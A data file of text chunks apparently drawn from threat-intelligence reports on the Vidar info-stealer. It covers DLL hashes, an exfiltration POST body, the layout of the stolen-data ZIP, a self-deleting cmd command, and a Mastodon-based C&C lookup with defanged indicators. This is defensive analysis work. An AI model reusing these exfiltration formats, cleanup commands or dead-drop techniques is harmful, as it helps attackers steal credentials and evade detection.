Nevertheless, once the ZIP file containing the DLLs is downloaded, it is extracted and the DLL binaries are saved to the C:\ProgramData staging directory. The resource update.zip contained the following DLLs: MD5 (freebl3.dll) = ef2834ac4ee7d6724f255beaf527e635 MD5 (libcurl.dll) = 37f98d28e694399e068bd9071dc16133 MD5 (mozglue.dll) = 8f73c08a9660691143661bf7332c3c27 MD5 (msvcp140.dll) = 109f0f02fd37c84bfc7508d4227d7ed5 MD5 (nss3.dll) = bfac4e3c5908856ba17d41edcd455a51 MD5 (softokn3.dll) = a2ee53de9167bf0d6c019303b7ca84e5 MD5 (sqlite3.dll) = e477a96c8f2b18d6b5c27bde49c990bf MD5 (vcruntime140.dll) = 7587bf9cb4147022cd5681b015183046

14/18

Data Exfiltration The harvested data is then sent back to the C2 server using a HTTP POST request.

15/18

HTTP POST body

-----



1531306219445135

Content



Disposition: form



data; name=""profile""

1375

-----



1531306219445135

Content



Disposition: form"|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|ea687c0d588749648ec012a86a236ca5
"-----



1531306219445135

Content



Disposition: form



data; name=""profile""

1375

-----



1531306219445135

Content



Disposition: form



data; name=""profile_id""

1700

-----



1531306219445135

Content



Disposition: form



data; name=""hwid""

d8d914bc22c31291311131



90059c37



1320



41a4



b58d



816d



806e6f6e6963

-----



1531306219445135

Content



Disposition: form



data; name=""token""

36bfd46626a0b531909b016919dd1fbd

-----



1531306219445135

Content



Disposition: form



data; name=""file""

UEsDBBQAAgAIAMSYl1XqxfupygAAAJMB...[truncated base64



encoded ZIP file]

-----



1531306219445135--

16/18

Interestingly, the token 36bfd46626a0b531909b016919dd1fbd matches the string contained within the initial config downloaded from the C2 server. The data harvested from the host is stored within the ZIP file in the POST request body. Directory structure of the ZIP file /History/Mozilla Firefox_qldyz51w.default.txt /Cookies/Google Chrome_Default.txt /History/Google Chrome_Default.txt /passwords.txt /information.txt /Files/Default.zip /Files/desktop.zip /screenshot.jpg"|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|5c44b460a1774c818a50203e548d129f
"It is important to note that this is not an exhaustive list of what the ZIP file exfiltrated from every system will look like. It will depend on both the stealer configuration set by the threat actor during the payload generation stage, and the software present on the compromised system. For example, the sample analyzed in this writeup included routines for stealing Discord tokens, data from Telegram and even FTP and SCP clients.

Cleanup Operations Once the data has been succesfully harvested and exfiltrated, the malware then deletes itself and any created files from the host with the following command: ""C:\Windows\System32\cmd.exe"" /c timeout /t 6 & del /f /q ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\AppLaunch.exe"" & exit

17/18

18/18"|data_input/vidar_reports/entry_d7731724-e096-4e47-a185-85dd797974ac.text|11c197cea4c847a8ae37177a0d63568f
"Vidar Exploiting Social Media Platform (Mastodon) asec.ahnlab.com/en/30875/ January 26, 2022

The ASEC analysis team has recently discovered that Vidar is exploiting a social media platform named Mastodon to create C&C server addresses.

1/4

Mastodon website Vidar is an info-stealer malware installed through spam emails and PUP, sometimes being disguised as a KMSAuto authenticator tool. It has been consistently distributed since the past, and there was a recent case of it being installed through other types of malware such as Stop ransomware. When Vidar is run, it first accesses the C&C server to receive commands and DLLs that are required to steal information before it can perform its infostealing activities. In the past, the malware simply connected to C&C server and received commands and additional files like other malware. Yet the recent Vidar type exploits various online platforms to actually create C&C servers. Last year, it used a game matching platform called FaceIt to do so, which was discussed in one of the ASEC blog posts. Vidar Info-Stealer Abusing Certain Game Platform Recent Vidar cases exploit Mastodon, a social media platform. When Vidar is run, it first accesses Mastodon (noc.social website) before it tries to communicate with the C&C server. To be more specific, it is a profile page of a user named “banda5ker”.

2/4"|data_input/vidar_reports/entry_e20bb18d-5f6c-48f3-bdf0-aa826088d40b.text|28c183c49a714558beadf19a189bb6ac
"2/4

Attacker’s Mastodon profile The profile page has the string shown below. It is the actual C&C server address of Vidar. “hello 162.55.213[. ]180|” The malware downloads the web page and searches the “hello” string, parsing the C&C address existing between the separator “|”.

Routine for C&C address parsing If the attacker edits the profile part and enters another address, the Vidar info-stealer will connect to the changed C&C server and continue to perform malicious activities. If Mastodon’s attacker account is not blocked, the attacker can repeatedly edit the C&C server to make the same malware connect to different C&C servers. It is likely that the attacker is using the method to bypass network detection for the C&C address.

3/4

Vidar connects to the actual C&C servers established and receives DLL files needed for commands and info-stealing, and ultimately sends the stolen information to the C&C server. Note that Vidar’s version is v49.6 (see figure of data sent below). The version of the Vidar strain which exploited FaceIt was v38.6."|data_input/vidar_reports/entry_e20bb18d-5f6c-48f3-bdf0-aa826088d40b.text|66a9e2d49a1948d5ab938123c04dad91
"Vidar’s network activities of sending stolen information The info-stealing features of Vidar are explained in the following post. Analysis of Info-Leaking Feature of Info-Stealer Malware Vidar AhnLab’s anti-malware software, V3, detects and blocks the malware using the following aliases: [File Detection] – Infostealer/Win.SmokeLoader.R465643 (2022.01.19.01) [Behavior Detection] – Malware/MDP.Vidar.M3505 [IOC] File 185cc9e866a23c5cff47d41e8834ffad C&C – hxxps://noc[. ]social/@banda5ker – hxxp://162.55.213[. ]180 Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to check related IOC and detailed analysis information. Categories:Malware Information Tagged as:C&C, InfoStealer, MASTADON, vidar, VidarMASTODON

4/4"|data_input/vidar_reports/entry_e20bb18d-5f6c-48f3-bdf0-aa826088d40b.text|9b6b2015125f44c2b957d3a0e1c363de
